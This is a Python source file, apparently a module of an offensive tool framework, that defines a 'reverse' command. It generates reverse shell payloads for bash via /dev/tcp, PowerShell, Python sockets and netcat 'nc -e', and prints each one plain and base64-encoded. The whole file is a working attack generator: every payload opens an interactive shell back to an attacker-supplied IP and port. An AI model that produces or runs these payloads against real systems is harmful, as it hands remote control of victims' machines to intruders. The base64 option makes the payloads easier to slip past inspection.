"""Reverse shell generator"""

from Commands import Command
import base64

class ReverseCommand(Command):
    name = "reverse"
    description = "Reverse shell payload generator"
    usage = "reverse [type] [ip] [port]"
    
    def execute(self, args):
        if len(args) < 3:
            print("Usage: reverse <type> <ip> <port>")
            print("Types: bash, powershell, python, nc")
            return
        
        type_ = args[0]
        ip = args[1]
        port = args[2]
        
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "powershell": f"$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc -e /bin/sh {ip} {port}"
        }
        
        print(f"\n[*] Reverse Shell ({type_}):")
        print(f"\n[+] Payload:")
        print(payloads.get(type_, "Unknown type"))
        
        # Encoded version
        payload = payloads.get(type_, "")
        encoded = base64.b64encode(payload.encode()).decode()
        print(f"\n[+] Base64 Encoded:")
        print(encoded)
